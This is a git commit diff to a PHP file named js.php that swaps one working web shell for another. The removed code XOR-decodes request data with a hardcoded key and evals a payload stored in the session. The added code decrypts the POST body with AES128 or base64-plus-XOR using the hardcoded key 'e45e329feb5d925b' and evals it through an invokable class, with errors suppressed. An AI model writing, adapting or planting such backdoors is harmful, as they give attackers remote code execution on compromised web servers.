c641e7f7b795461d4915e91217b9ee30a93aa89b
momika233 <56291820+momika233@users.noreply.github.com>
2022-08-08 16:40:45 +0800

    Update js.php

--- js.php
+++ js.php
@@ -1,29 +1,26 @@
 <?php
-@session_start();
-@set_time_limit(0);
 @error_reporting(0);
-function encode($D,$K){
-    for($i=0;$i<strlen($D);$i++) {
-        $c = $K[$i+1&15];
-        $D[$i] = $D[$i]^$c;
-    }
-    return $D;
-}
-$payloadName='payload';
-$key='0049cf04cacfcc46';
-$data=file_get_contents("php://input");
-if ($data!==false){
-    $data=encode($data,$key);
-    if (isset($_SESSION[$payloadName])){
-        $payload=encode($_SESSION[$payloadName],$key);
-        if (strpos($payload,"getBasicsInfo")===false){
-            $payload=encode($payload,$key);
-        }
-		eval($payload);
-        echo encode(@run($data),$key);
-    }else{
-        if (strpos($data,"getBasicsInfo")!==false){
-            $_SESSION[$payloadName]=encode($data,$key);
-        }
-    }
-}
+session_start();
+    $key="e45e329feb5d925b";
+	$_SESSION['k']=$key;
+	session_write_close();
+	$post=file_get_contents("php://input");
+	if(!extension_loaded('openssl'))
+	{
+		$t="base64_"."decode";
+		$post=$t($post."");
+		
+		for($i=0;$i<strlen($post);$i++) {
+    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
+    			}
+	}
+	else
+	{
+		$post=openssl_decrypt($post, "AES128", $key);
+	}
+    $arr=explode('|',$post);
+    $func=$arr[0];
+    $params=$arr[1];
+	class C{public function __invoke($p) {eval($p."");}}
+    @call_user_func(new C(),$params);
+?>
